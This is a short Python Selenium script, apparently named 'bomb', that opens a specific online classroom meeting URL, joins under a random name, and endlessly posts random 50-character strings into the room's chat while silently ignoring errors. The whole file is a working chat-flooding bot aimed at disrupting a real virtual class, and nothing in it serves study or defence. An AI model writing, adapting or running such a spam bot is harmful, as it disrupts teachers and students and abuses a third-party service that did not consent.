"""
__          ______ ____        _                       ____  _                 _       ___       _
\ \        / /___ \___ \      | |                     |___ \| |               | |     / _ \     | |
 \ \  /\  / /  __) |__) | __ _| |_ __ _ _ __ __ ___   ____) | | __ _ _ __   __| |_ __| | | | ___| | _____
  \ \/  \/ /  |__ <|__ < / _` | __/ _` | '__/ _` \ \ / /__ <| |/ _` | '_ \ / _` | '__| | | |/ __| |/ / __|
   \  /\  /   ___) |__) | (_| | || (_| | | | (_| |\ V /___) | | (_| | | | | (_| | |  | |_| | (__|   <\__ \
    \/  \/   |____/____/ \__,_|\__\__, |_|  \__,_| \_/|____/|_|\__,_|_| |_|\__,_|_|   \___/ \___|_|\_\___/
                                   __/ |
                                  |___/
"""
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common import actions
import random


class bomb():
    def __init__(self):
        options = webdriver.ChromeOptions()
        options.add_experimental_option("excludeSwitches", ["ignore-certificate-errors"])
        self.driver = webdriver.Chrome('./chromedriver.exe', options=options)
        self.driver.maximize_window()

    def run(self):
        self.driver.get('https://classroom.lgs.digital/b/reg-n1e-ghh-d9s')
        join_name = True
        join = True
        audio = True

        name = ''
        for _ in range(10):
            random_integer = random.randint(97, 97 + 26 - 1)
            flip_bit = random.randint(0, 1)
            random_integer = random_integer - 32 if flip_bit == 1 else random_integer
            name += (chr(random_integer))

        while True:
            try:
                random_string = ''
                for _ in range(50):
                    random_integer = random.randint(97, 97 + 26 - 1)
                    flip_bit = random.randint(0, 1)
                    random_integer = random_integer - 32 if flip_bit == 1 else random_integer
                    random_string += (chr(random_integer))

                if (join_name):
                    join_input = self.driver.find_element_by_xpath('/html/body/div[2]/div[1]/div/div[2]/div[2]/form/div/input[4]')
                    join_input.clear()
                    join_input.send_keys(name)
                    join_name = False

                if (join):
                    self.driver.find_element_by_xpath('//*[@id="room-join"]').click()
                    join = False

                if (audio):
                    self.driver.find_element_by_xpath('/html/body/div[2]/div/div/header/button/span[1]/i').click()
                    audio = False

                text_send = self.driver.find_element_by_xpath('//*[@id="message-input"]')
                text_send.clear()
                text_send.send_keys(random_string)

                self.driver.find_element_by_xpath('/html/body/div/main/section/div[4]/section/div/form/div[1]/button/span[1]/i').click()
            except Exception:
                pass

bomb().run()